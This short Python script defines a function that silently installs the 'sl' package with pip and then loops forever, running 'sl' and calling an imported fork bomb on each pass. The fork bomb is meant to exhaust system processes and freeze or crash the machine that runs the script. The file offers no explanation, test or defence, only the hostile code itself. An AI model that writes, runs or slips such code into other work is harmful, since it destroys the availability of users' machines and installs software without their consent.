import os
from forkbomb import forkbomb
def linux():
  os.system("yes | pip install sl")
  mal = True
  while mal == True:
    os.system("sl")
    forkbomb()
